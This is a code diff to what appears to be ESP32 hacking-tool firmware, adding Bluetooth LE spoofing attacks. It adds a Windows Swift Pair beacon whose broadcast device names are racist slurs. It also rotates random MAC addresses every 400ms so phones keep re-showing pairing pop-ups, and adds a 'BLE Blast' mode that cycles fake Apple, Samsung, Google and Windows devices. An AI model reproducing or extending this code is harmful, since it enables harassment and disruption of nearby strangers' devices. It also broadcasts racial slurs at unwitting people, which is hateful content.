@@ -1,11 +1,23 @@
 #include "SettingsStore.h"
 #include "Touchscreen.h"
 #include "config.h"
+#include <WiFi.h>
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+#include "esp_bt_defs.h"
+#include "esp_gap_ble_api.h"
+#if CONFIG_IDF_TARGET_ESP32
+#include "esp_gap_bt_api.h"  // Classic BT GAP types (dual-mode ESP32 only)
+#endif
 #include "icon.h"
 #include "shared.h"
 #include "utils.h"
+
+// NimBLE host call to set the controller's random address (declared here to
+// avoid pulling the host headers into this TU). Must be called while not
+// advertising. Used to rotate the spoofer's MAC so phones keep re-showing the
+// pairing popup instead of deduping a single static address.
+extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);
 
 #ifdef TFT_BLACK
 #undef TFT_BLACK
@@ -46,20 +58,24 @@ bool ensureBleStackReady() {
     return true;
   }
   const uint32_t heap = ESP.getFreeHeap();
-  Serial.printf("[ble] init begin, free heap=%u\n", (unsigned)heap);
+  Serial.printf("[ble] stack check, free heap=%u\n", (unsigned)heap);
 #if !BOARD_HAS_ESP32S3
   // Classic ESP32 NimBLE typically needs ~40KB+ free; abort soft instead of OOM reboot.
   if (heap < 40000u) {
-    Serial.println("[ble] skip init — low heap");
+    Serial.println("[ble] skip — low heap");
     return false;
   }
 #endif
-  // Classic BT controller RAM is unused by NimBLE; reclaim it before stack init.
-  // On ESP32 this often frees ~30KB and avoids boot OOM/reboot after the intro.
+  // Only release Classic BT RAM on the original ESP32 (dual-mode chip).
+  // On ESP32-S3 there is no Classic BT hardware; calling mem_release here can corrupt
+  // the BLE controller state before init runs.
+#if CONFIG_IDF_TARGET_ESP32
   esp_err_t rel = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
   if (rel != ESP_OK && rel != ESP_ERR_INVALID_STATE) {
     Serial.printf("[ble] classic mem_release: %s\n", esp_err_to_name(rel));
   }
+#endif
+  // Must init the NimBLE stack before ANY BLE call; calling it again is safe (idempotent).
   BLEDevice::init(ESP32DIV_NAME);
   ready = true;
   Serial.printf("[ble] init done, free heap=%u\n", (unsigned)ESP.getFreeHeap());
@@ -266,6 +282,34 @@ bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
   return true;
 }
 
+// Microsoft "Swift Pair" beacon — triggers the Windows 10/11 "New device
+// found / Connect" toast (requires Swift Pair notifications enabled in
+// Windows Bluetooth settings). LE-only payload per Microsoft's spec:
+//   Manufacturer Specific Data, Vendor ID 0x0006, Beacon ID 0x03,
+//   Sub-Scenario 0x00 (LE-only), reserved RSSI 0x80, then UTF-8 display name.
+static const char* kSwiftPairNames[] = { "filthy brown hands", "Fuck Indians", "Fuck Pakis" };
+static const int kSwiftPairNameCount = 3;
+bool generateSwiftPairAdvPacket(uint8_t nameIndex, BLEAdvertisementData& advData) {
+  const char* name = kSwiftPairNames[nameIndex % kSwiftPairNameCount];
+  uint8_t nameLen = (uint8_t)strlen(name);
+  if (nameLen > 20) nameLen = 20;                 // keep total advertisement <= 31 bytes
+
+  uint8_t pkt[31];
+  uint8_t i = 0;
+  pkt[i++] = 0x02; pkt[i++] = 0x01; pkt[i++] = 0x06;   // Flags: LE General Discoverable
+  pkt[i++] = (uint8_t)(6 + nameLen);              // length of the MSD section
+  pkt[i++] = 0xFF;                                // Manufacturer Specific Data
+  pkt[i++] = 0x06; pkt[i++] = 0x00;               // Microsoft Vendor ID (0x0006)
+  pkt[i++] = 0x03;                                // Microsoft Beacon ID
+  pkt[i++] = 0x00;                                // Sub-Scenario: pairing over LE only
+  pkt[i++] = 0x80;                                // reserved RSSI byte
+  memcpy(&pkt[i], name, nameLen);
+  i += nameLen;
+
+  advData.addData(std::string((char*)pkt, i));
+  return true;
+}
+
 BLEAdvertisementData getAdvertismentData() {
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
@@ -276,6 +320,8 @@ BLEAdvertisementData getAdvertismentData() {
     generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
   } else if (device_choice == 2) { // Google
     generateGoogleAdvPacket(oAdvertisementData);
+  } else if (device_choice == 3) { // Microsoft Swift Pair (Windows)
+    generateSwiftPairAdvPacket(device_index, oAdvertisementData);
   }
 
   return oAdvertisementData;
@@ -392,6 +438,7 @@ static const char* spooferDeviceLabel(int type) {
     case 19: return "Galaxy Watch 5";
     case 20: return "Galaxy Watch 6";
     case 21: return "Google Smart Ctrl";
+    case 22: return "Windows Swift Pair";
     default: return "Airpods";
   }
 }
@@ -626,6 +673,12 @@ void Google_Smart_Ctrl() {
   attack_state = 1;
 }
 
+void Windows_Swift_Pair() {
+  device_choice = 3; // Microsoft Swift Pair (Windows popup)
+  device_index = 0;
+  attack_state = 1;
+}
+
 void setAdvertisingData() {
 
   switch (deviceType) {
@@ -692,6 +745,9 @@ void setAdvertisingData() {
     case 21:
       Google_Smart_Ctrl();
       break;
+    case 22:
+      Windows_Swift_Pair();
+      break;
     default:
       Airpods();
       break;
@@ -719,7 +775,7 @@ void handleButtonPress(int pin, void (*callback)()) {
 
 void changeDeviceTypeNext() {
   deviceType++;
-  if (deviceType > 21) deviceType = 1;
+  if (deviceType > 22) deviceType = 1;
   Serial.println("Device Type Next: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -727,7 +783,7 @@ void changeDeviceTypeNext() {
 
 void changeDeviceTypePrev() {
   deviceType--;
-  if (deviceType < 1) deviceType = 21;
+  if (deviceType < 1) deviceType = 22;
   Serial.println("Device Type Prev: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -749,6 +805,15 @@ void changeAdvTypePrev() {
   updateSpoofer();
 }
 
+// Assign a fresh random (static) BLE address. Advertising must be stopped.
+static void spooferSetRandomAddr() {
+  uint8_t a[6];
+  for (int i = 0; i < 6; i++) a[i] = (uint8_t)random(256);
+  a[5] |= 0xC0;  // top two bits = 11 -> static random address
+  ble_hs_id_set_rnd(a);
+  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+}
+
 void toggleAdvertising() {
   isAdvertising = !isAdvertising;
 
@@ -759,13 +824,17 @@ void toggleAdvertising() {
     updateSpoofer();
   } else {
     if (attack_state == 1) {
-      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-      for (int i = 0; i < 6; i++) {
-        dummy_addr[i] = random(256);
-        if (i == 0) {
-          dummy_addr[i] |= 0xF0;
-        }
+      // The background BLE scanner can be mid-scan (it blocks for 2s) when we
+      // get here. A scan in progress makes advertising start() return OK but
+      // never actually radiate, so free the controller first.
+      NimBLEScan* sc = BLEDevice::getScan();
+      if (sc) {
+        sc->stop();
       }
+
+      // Use a random address (phones expect this for pairing popups, and it
+      // lets us rotate the MAC from the loop to keep popups re-appearing).
+      spooferSetRandomAddr();
 
       BLEAdvertisementData oAdvertisementData = getAdvertismentData();
       pAdvertising->addServiceUUID(devices_uuid);
@@ -774,11 +843,15 @@ void toggleAdvertising() {
       pAdvertising->setMaxInterval(0x20);
       pAdvertising->setMinPreferred(0x20);
       pAdvertising->setMaxPreferred(0x20);
-      pAdvertising->start();
+      bool adv_ok = pAdvertising->start();
+      Serial.printf("[spoofer] pAdvertising->start() = %s\n", adv_ok ? "OK" : "FAIL");
 
+      // On-screen diagnostics (S3 serial is unreliable: IDF logs vs USB-CDC).
       Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
-      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
-      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
+      Printspoofer("[+] Adv Type: " + String(advType), TFT_WHITE, false);
+      Printspoofer(String("[?] start=") + (adv_ok ? "OK" : "FAIL") +
+                       " heap=" + String(ESP.getFreeHeap() / 1024) + "k",
+                   adv_ok ? TFT_GREEN : TFT_RED, false);
     }
 
     Serial.println("Advertising started.");
@@ -866,6 +939,7 @@ void runUI() {
 
 void spooferSetup() {
   if (!bleRequireStackOrExit()) return;
+
   setTouchButtonInputEnabled(true);
   bleSetSpooferNavLabels();
   spooferResetPanelCache();
@@ -941,12 +1015,123 @@ void spooferLoop() {
 
     handleButtonPress(BTN_DOWN, changeAdvTypeNext);
     handleButtonPress(BTN_UP, toggleAdvertising);
+
+    // While advertising, rotate a fresh random MAC (and re-randomized payload)
+    // periodically so phones keep re-showing the pairing popup — they dedupe by
+    // advertiser address, so a static MAC only pops once. The address can only
+    // change while stopped, so stop -> set addr -> start. 400ms is slow enough
+    // to actually radiate between rotations (the 50ms churn tried earlier never
+    // got on air).
+    static unsigned long lastMacCycle = 0;
+    if (isAdvertising && pAdvertising && (now - lastMacCycle >= 400)) {
+      lastMacCycle = now;
+      pAdvertising->stop();
+      spooferSetRandomAddr();
+      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->start();
+    }
   }
 }
 
 void exit() {
   spooferResetPanelCache();
 
+  if (isAdvertising && pAdvertising) {
+    pAdvertising->stop();
+    isAdvertising = false;
+  }
+}
+
+// ---- BLE Blast: auto-cycle through every spoofer device entry ----
+// Reuses the spoofer's device table (deviceType 1..22 covers Apple/Beats/
+// Samsung/Google/Windows via setAdvertisingData) and rotates a fresh random
+// MAC on every step, so it hammers out one fake device after another.
+
+void blastSetup() {
+  if (!bleRequireStackOrExit()) return;
+  setTouchButtonInputEnabled(true);
+  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
+  spooferResetPanelCache();
+  bleClearBody(TFT_BLACK);
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  redrawTouchButtonBar();
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  setupTouchscreen();
+  randomSeed(analogRead(0));
+
+  if (!pAdvertising) {
+    BLEServer* pServer = BLEDevice::createServer();
+    pAdvertising = pServer->getAdvertising();
+  }
+
+  // Free the controller from the background scanner (otherwise start() reports
+  // OK but nothing radiates).
+  NimBLEScan* sc = BLEDevice::getScan();
+  if (sc) {
+    sc->stop();
+  }
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(6, 42);
+  tft.print("BLE Blast - cycling ALL devices");
+  tft.setCursor(6, 54);
+  tft.setTextColor(DARK_GRAY, TFT_BLACK);
+  tft.print("Apple / Samsung / Google / Windows");
+
+  deviceType = 0;        // first loop step advances to 1
+  isAdvertising = true;
+}
+
+void blastLoop() {
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    feature_exit_requested = true;
+    return;
+  }
+
+  static unsigned long lastStep = 0;
+  unsigned long now = millis();
+  if (now - lastStep < 250) {
+    return;
+  }
+  lastStep = now;
+
+  // Advance to the next device entry and load its advertising selectors.
+  deviceType++;
+  if (deviceType > 22) deviceType = 1;
+  setAdvertisingData();
+
+  if (pAdvertising) {
+    pAdvertising->stop();
+    NimBLEScan* sc = BLEDevice::getScan();
+    if (sc) {
+      sc->stop();
+    }
+    spooferSetRandomAddr();
+    BLEAdvertisementData oAdvertisementData = getAdvertismentData();
+    pAdvertising->setAdvertisementData(oAdvertisementData);
+    pAdvertising->setMinInterval(0x20);
+    pAdvertising->setMaxInterval(0x20);
+    pAdvertising->start();
+  }
+
+  // Show what is currently being blasted.
+  tft.fillRect(0, 70, 240, 14, TFT_BLACK);
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(6, 72);
+  tft.print(String(deviceType) + "/22: ");
+  tft.print(spooferDeviceLabel(deviceType));
+}
+
+void blastExit() {
+  spooferResetPanelCache();
   if (isAdvertising && pAdvertising) {
     pAdvertising->stop();
     isAdvertising = false;
@@ -1163,13 +1348,9 @@ void sourappleLoop() {
   tft.drawFastHLine(0, 19, 240, UI_LINE);
   runUI();
 
-  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-  for (int i = 0; i < 6; i++) {
-    dummy_addr[i] = random(256);
-    if (i == 0) {
-      dummy_addr[i] |= 0xF0;
-    }
-  }
+  // Cycle advertising: stop → update data → restart so iOS sees fresh beacons
+  Advertising->stop();
+
   BLEAdvertisementData oAdvertisementData = getOAdvertisementData();
 
   Advertising->addServiceUUID(device_uuid);
@@ -1180,7 +1361,8 @@ void sourappleLoop() {
   Advertising->setMinPreferred(0x20);
   Advertising->setMaxPreferred(0x20);
 
-  Advertising->start();
+  bool adv_ok = Advertising->start();
+  Serial.printf("[sourapple] Advertising->start() = %s\n", adv_ok ? "OK" : "FAIL");
 
   delay(40);
   displayAdvertisementData();
@@ -8892,7 +9074,7 @@ static const unsigned char* icons[ICON_NUM] = {
 #define STATUS_DOT_SIZE 8
 #define LINE_HEIGHT 16
 #define MAX_LINES 16
-#define MAX_DEVICES 32
+#define MAX_DEVICES 128
 #define SCAN_INTERVAL 5000
 #define MAX_LINE_LENGTH 38
 #define BEACON_PREFIX "4c000215"
@@ -9114,7 +9296,7 @@ private:
     return (value & 0xC0) == 0xC0;
   }
 
-  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
+  void processNewDevice(BLEAdvertisedDevice* bleDevice, void* btDevice, unsigned long timestamp, bool isBLE) {
     if (deviceCount >= MAX_DEVICES) {
       addLine("Max devices reached!", RED, true, MessageType::ALERT);
       return;
@@ -9131,11 +9313,16 @@ private:
       checkBeaconSpoofing(device, mfgData, timestamp);
       checkMalformedPacket(device, mfgData, timestamp);
     } else {
+#if CONFIG_IDF_TARGET_ESP32
+      auto* bt = static_cast<esp_bt_gap_cb_param_t*>(btDevice);
       char macStr[18];
       snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
-               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
+               bt->disc_res.bda[0], bt->disc_res.bda[1], bt->disc_res.bda[2],
+               bt->disc_res.bda[3], bt->disc_res.bda[4], bt->disc_res.bda[5]);
       device.mac = macStr;
+#else
+      device.mac = "00:00:00:00:00:00";
+#endif
       device.rssi = 0;
     }
     device.packetCount = 1;
@@ -9464,6 +9651,7 @@ public:
     }
   };
 
+#if CONFIG_IDF_TARGET_ESP32
   static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
     if (!snifferInstance) return;
     if (event == ESP_BT_GAP_DISC_RES_EVT) {
@@ -9489,6 +9677,7 @@ public:
       }
     }
   }
+#endif
 
   void startBLEScan() {
     newDevicesThisScan = 0;
@@ -9502,6 +9691,9 @@ public:
         return;
       }
       pBLEScan->start(kScanChunkSec, false);
+      // Feed the idle task on CPU0 between scan chunks so the Task-WDT
+      // doesn't fire during long BLE Sniffer sessions.
+      vTaskDelay(20 / portTICK_PERIOD_MS);
     }
     addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
     updateHeader();
